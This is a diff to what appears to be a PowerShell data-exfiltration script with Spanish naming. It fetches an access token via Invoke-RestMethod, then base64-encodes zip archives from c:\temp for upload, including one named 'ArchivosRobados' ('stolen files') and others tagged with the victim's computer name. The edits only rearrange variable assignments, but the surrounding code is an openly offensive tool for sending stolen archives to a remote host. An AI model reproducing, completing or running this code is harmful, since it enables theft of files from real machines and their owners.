@@ -171,9 +171,6 @@ $accessToken = (Invoke-RestMethod @params).access_token
 
 # Change this to the file you want to upload
 $ArchivosRobados = "$env:computername"
-#$FileEncrypted = 'c:\temp\ArchivosRobados-"$ArchivosRobados".zip'
-
-Write-Host "Nombre de archivos Robados: $ArchivosRobados" -ForegroundColor Green
 
 # Get the source file contents and details, encode in base64
 $sourceItem = Get-Item 'c:\temp\ArchivosRobados-"$ArchivosRobados".zip'
@@ -244,10 +241,10 @@ $params = @{
 $accessToken = (Invoke-RestMethod @params).access_token
 
 # Change this to the file you want to upload
-$FileEncrypted2 = c:\temp\backup-"$NomComputadora".zip
+$NomComputadora = "$env:computername"
 
 # Get the source file contents and details, encode in base64
-$sourceItem = Get-Item $FileEncrypted2
+$sourceItem = Get-Item 'c:\temp\backup-"$NomComputadora".zip'
 $sourceBase64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($sourceItem.FullName))
 $sourceMime = [System.Web.MimeMapping]::GetMimeMapping($sourceItem.FullName)
 
@@ -315,10 +312,10 @@ $params = @{
 $accessToken = (Invoke-RestMethod @params).access_token
 
 # Change this to the file you want to upload
-$FileEncrypted3 = c:\temp\backup1-"$NomComputadora".zip
+$NomComputadora = "$env:computername"
 
 # Get the source file contents and details, encode in base64
-$sourceItem = Get-Item $FileEncrypted3
+$sourceItem = Get-Item 'c:\temp\backup1-"$NomComputadora".zip'
 $sourceBase64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($sourceItem.FullName))
 $sourceMime = [System.Web.MimeMapping]::GetMimeMapping($sourceItem.FullName)
 
